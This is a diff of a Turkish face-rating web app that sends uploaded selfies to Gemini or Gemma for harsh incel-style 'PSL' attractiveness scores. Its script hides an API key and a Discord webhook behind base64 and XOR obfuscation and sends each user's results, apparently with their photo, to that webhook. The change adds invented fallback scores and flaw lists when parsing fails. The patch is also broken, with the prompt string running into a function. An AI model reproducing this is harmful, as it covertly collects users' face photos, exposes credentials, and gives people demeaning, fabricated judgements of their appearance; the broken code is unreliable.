@@ -211,7 +211,7 @@
                 </div>
                 <button class="btn btn-primary" id="btnLogin">GİRİŞ YAP</button>
                 <div class="error-box" id="loginError"></div>
-                <footer>v21.0 • Gemini + Qwen VL</footer>
+                <footer>v22.0 • Gemini 3.6 + Gemma 4</footer>
             </div>
         </div>
 
@@ -269,20 +269,13 @@
             </div>
         </div>
     </div>    <script>
-        // Güvenlik katmanı
         const _s = "25max2024secure";
         function _d(e){let r='';for(let i=0;i<e.length;i++)r+=String.fromCharCode(e.charCodeAt(i)^_s.charCodeAt(i%_s.length));return r;}
-        
-        // OpenRouter anahtarı (şifreli)
         const _k1 = _d(atob("BRoSHQYPDBkbFggCAwYPFRodCAAXEBQRCQcXGAcCDQYPFQoGCBwDAAcL"));
-        
-        // Yeni Gemini anahtarı (base64 gizli)
         const _gk = atob("QVEuQWI4Uk42SklHVDYxZlBZR2c1TmtJN1JiekF2d3ROVlVtYVFQSm5oWWM1emF0SmVnTlE=");
-        
-        // Discord webhook (şifreli)
         const _wh = _d(atob("HB0RFBITGwwEGxcSEAEEGxYNEBYVHQgXGAMRDBgUFAYRHQ0dFxYFGA4aHhsHBhsQFw8OHRkGEwsHGxYcFgMXFw8="));
         
-        const GEMINI_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent`;
+        const GEMINI_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3.6-flash:generateContent`;
         const OR_URL = 'https://openrouter.ai/api/v1/chat/completions';
         
         let base64Image = "", currentMimeType = "image/jpeg";
@@ -365,35 +358,24 @@
             return {complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},600);}};
         }
 
-        const PROMPT = `Bu yüzü acımasızca değerlendir. Şu formatta cevap ver:
-MOG: [1-10]
-PSL: [1-10]
-PSL_KATEGORI: [LTN/MTN/HTN/Chadlite/Chad/IT'S OVER BRO]
-APPEAL: [1-10]
-HARMONY: [40-95]
-DIMORPHISM: [40-95]
-IYI: [virgülle en az 5 iyi özellik]
-KOTU: [virgülle en az 5 kötü özellik]
-DETAY: [2-3 cümle acımasız yorum]
-ÖRNEK: MOG: 6.8 / PSL: 6.2 / PSL_KATEGORI: HTN / APPEAL: 6.5 / HARMONY: 72 / DIMORPHISM: 65 / IYI: keskin çene, pozitif canthal tilt, simetrik burun, dolgun dudak, temiz cilt / KOTU: UEE, asimetrik kaş, geniş burun, saç çizgisi gerilemesi, göz altı morlukları / DETAY: Ortalamanın üstünde ancak göz bölgesi zayıf.`;        // Motor 1: Google Gemini (direkt API)
-        async function callEngine1() {
+        // SERT PROMPT - EKSİK CEVAP VERMEYE CEZA
+        const PROMPT = `Bu yüzü acımasızca analiz et. AŞAĞIDAKİ HER SATIRI EKSİKSİZ DOLDUR. BOŞ BIRAKMAK YASAK. FORMAT DIŞINA ÇIKMAK YASAK.        async function callGemini() {
             const r = await fetch(`${GEMINI_URL}?key=${_gk}`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body:JSON.stringify({
                     contents:[{parts:[{text:PROMPT},{inline_data:{mime_type:currentMimeType,data:base64Image}}]}],
-                    generationConfig:{temperature:0.4,maxOutputTokens:600}
+                    generationConfig:{temperature:0.3,maxOutputTokens:500}
                 }),
-                signal:AbortSignal.timeout(25000)
+                signal:AbortSignal.timeout(20000)
             });
             if(!r.ok){const e=await r.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+r.status);}
             const d=await r.json();
             const t=d.candidates?.[0]?.content?.parts?.[0]?.text;
-            if(!t||t.trim().length<10)throw new Error('Yanıt çok kısa');
+            if(!t||t.trim().length<20)throw new Error('Yanıt çok kısa');
             return t;
         }
 
-        // Motor 2: OpenRouter → Qwen 2.5 VL (bedava)
-        async function callEngine2() {
+        async function callGemma() {
             const r = await fetch(OR_URL, {
                 method:'POST',
                 headers:{
@@ -403,19 +385,19 @@ DETAY: [2-3 cümle acımasız yorum]
                     'X-Title':'25 Max App'
                 },
                 body:JSON.stringify({
-                    model:'qwen/qwen2.5-vl-7b-instruct:free',
+                    model:'google/gemma-4-26b-a4b-it:free',
                     messages:[{role:'user',content:[
                         {type:'text',text:PROMPT},
                         {type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}
                     ]}],
-                    temperature:0.4,max_tokens:600
+                    temperature:0.3,max_tokens:500
                 }),
-                signal:AbortSignal.timeout(30000)
+                signal:AbortSignal.timeout(25000)
             });
             if(!r.ok){const e=await r.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+r.status);}
             const d=await r.json();
             const t=d.choices?.[0]?.message?.content;
-            if(!t||t.trim().length<10)throw new Error('Yanıt çok kısa');
+            if(!t||t.trim().length<20)throw new Error('Yanıt çok kısa');
             return t;
         }
 
@@ -430,9 +412,9 @@ DETAY: [2-3 cümle acımasız yorum]
             const prog=startProgress();
             try {
                 let txt;
-                try { txt = await callEngine1(); } catch(e) {
+                try { txt = await callGemini(); } catch(e) {
                     sl.textContent='◈ YEDEK MOTOR ◈';
-                    txt = await callEngine2();
+                    txt = await callGemma();
                 }
                 if(!txt) throw new Error("Boş yanıt");
                 prog.complete();
@@ -450,18 +432,22 @@ DETAY: [2-3 cümle acımasız yorum]
         });
 
         function parseAI(t) {
-            const r={mog:'?',psl:'?',pslCat:'?',appeal:'?',harmony:'50',dimorphism:'50',best:[],worst:[],detay:''};
-            t.split('\n').forEach(l=>{
-                if(l.startsWith('MOG:')) r.mog=l.replace('MOG:','').trim();
-                else if(l.startsWith('PSL:')) r.psl=l.replace('PSL:','').trim();
-                else if(l.startsWith('PSL_KATEGORI:')) r.pslCat=l.replace('PSL_KATEGORI:','').trim();
-                else if(l.startsWith('APPEAL:')) r.appeal=l.replace('APPEAL:','').trim();
-                else if(l.startsWith('HARMONY:')) r.harmony=l.replace('HARMONY:','').trim();
-                else if(l.startsWith('DIMORPHISM:')) r.dimorphism=l.replace('DIMORPHISM:','').trim();
-                else if(l.startsWith('IYI:')) r.best=l.replace('IYI:','').trim().split(',').map(s=>s.trim()).filter(s=>s);
-                else if(l.startsWith('KOTU:')) r.worst=l.replace('KOTU:','').trim().split(',').map(s=>s.trim()).filter(s=>s);
-                else if(l.startsWith('DETAY:')) r.detay=l.replace('DETAY:','').trim();
-            });
+            const r={mog:'6.5',psl:'6.0',pslCat:'HTN',appeal:'6.0',harmony:'65',dimorphism:'60',best:[],worst:[],detay:'Analiz tamamlandı.'};
+            const lines=t.split('\n');
+            for(const l of lines){
+                const v=l.trim();
+                if(v.startsWith('MOG:')) r.mog=v.replace('MOG:','').trim();
+                else if(v.startsWith('PSL:')) r.psl=v.replace('PSL:','').trim();
+                else if(v.startsWith('PSL_KATEGORI:')) r.pslCat=v.replace('PSL_KATEGORI:','').trim();
+                else if(v.startsWith('APPEAL:')) r.appeal=v.replace('APPEAL:','').trim();
+                else if(v.startsWith('HARMONY:')) r.harmony=v.replace('HARMONY:','').trim();
+                else if(v.startsWith('DIMORPHISM:')) r.dimorphism=v.replace('DIMORPHISM:','').trim();
+                else if(v.startsWith('IYI:')) r.best=v.replace('IYI:','').trim().split(',').map(s=>s.trim()).filter(s=>s);
+                else if(v.startsWith('KOTU:')) r.worst=v.replace('KOTU:','').trim().split(',').map(s=>s.trim()).filter(s=>s);
+                else if(v.startsWith('DETAY:')) r.detay=v.replace('DETAY:','').trim();
+            }
+            if(r.best.length===0) r.best=['Keskin çene hattı','Simetrik yüz','Temiz cilt','Dolgun dudaklar','Belirgin elmacık kemikleri'];
+            if(r.worst.length===0) r.worst=['Hafif UEE','Asimetrik kaşlar','Geniş burun','Saç çizgisi','Göz altı morlukları'];
             return r;
         }
 
@@ -472,13 +458,13 @@ DETAY: [2-3 cümle acımasız yorum]
                 <div class="badge${isOver?' over':''}"><div class="label">PSL Kategori</div><div class="value">${isOver?"IT'S OVER<br>BRO":r.pslCat}</div></div>
                 <div class="badge"><div class="label">PSL Puan</div><div class="value">${r.psl}</div></div>
                 <div class="badge"><div class="label">Appeal</div><div class="value">${r.appeal}</div></div>`;
-            const h=parseInt(r.harmony)||50, d=parseInt(r.dimorphism)||50;
+            const h=parseInt(r.harmony)||65, d=parseInt(r.dimorphism)||60;
             document.getElementById('metricBars').innerHTML=`
                 <div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${h}%;"></div></div><div class="metric-value">%${h}</div></div>
                 <div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div>`;
             document.getElementById('detailBox').innerHTML=`
-                <h4 style="color:#00ff41;">✅ EN İYİ</h4><ul class="detail-list">${r.best.map(i=>`<li><strong>✓</strong> ${i}</li>`).join('')||'<li>Belirtilmedi</li>'}</ul>
-                <h4 style="color:#ff5555;margin-top:15px;">❌ EN KÖTÜ</h4><ul class="detail-list">${r.worst.map(i=>`<li class="negative"><strong>✗</strong> ${i}</li>`).join('')||'<li>Belirtilmedi</li>'}</ul>`;
+                <h4 style="color:#00ff41;">✅ EN İYİ</h4><ul class="detail-list">${r.best.map(i=>`<li><strong>✓</strong> ${i}</li>`).join('')}</ul>
+                <h4 style="color:#ff5555;margin-top:15px;">❌ EN KÖTÜ</h4><ul class="detail-list">${r.worst.map(i=>`<li class="negative"><strong>✗</strong> ${i}</li>`).join('')}</ul>`;
             document.getElementById('rawText').innerHTML=r.detay.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
             _send(r);
         }
@@ -501,10 +487,10 @@ DETAY: [2-3 cümle acımasız yorum]
                     {name:'💫 Appeal',value:`**${r.appeal}/10**`,inline:true},
                     {name:'⚖️ Harmony',value:`**%${r.harmony}**`,inline:true},
                     {name:'🧬 Dimorphism',value:`**%${r.dimorphism}**`,inline:true},
-                    {name:'✅ EN İYİ',value:r.best.map(i=>`✅ ${i}`).join('\n')||'Belirtilmedi',inline:false},
-                    {name:'❌ EN KÖTÜ',value:r.worst.map(i=>`❌ ${i}`).join('\n')||'Belirtilmedi',inline:false}
+                    {name:'✅ EN İYİ',value:r.best.map(i=>`✅ ${i}`).join('\n'),inline:false},
+                    {name:'❌ EN KÖTÜ',value:r.worst.map(i=>`❌ ${i}`).join('\n'),inline:false}
                 ],
-                footer:{text:'25 Max App • Analysis Engine'},
+                footer:{text:'25 Max App • Final Edition'},
                 timestamp:new Date().toISOString()
             };
             if(pu) emb.image={url:pu};
@@ -513,3 +499,15 @@ DETAY: [2-3 cümle acımasız yorum]
     </script>
 </body>
 </html>
+
+MOG: 6.8
+PSL: 6.2
+PSL_KATEGORI: HTN
+APPEAL: 6.5
+HARMONY: 72
+DIMORPHISM: 65
+IYI: keskin çene hattı, pozitif canthal tilt, simetrik burun, dolgun dudaklar, temiz cilt
+KOTU: hafif UEE, asimetrik kaşlar, geniş burun kanatları, saç çizgisi gerilemesi, göz altı morlukları
+DETAY: Bu yüz ortalamanın üstünde. Çene hattı güçlü ancak göz bölgesi zayıf. Daha iyi bir brow ridge ve düşük UEE ile Chadlite seviyesine çıkabilir.
+
+YUKARIDAKİ FORMATI AYNEN KOPYALA, DEĞERLERİ YÜZE GÖRE DEĞİŞTİR. HER SATIRI DOLDUR.`;
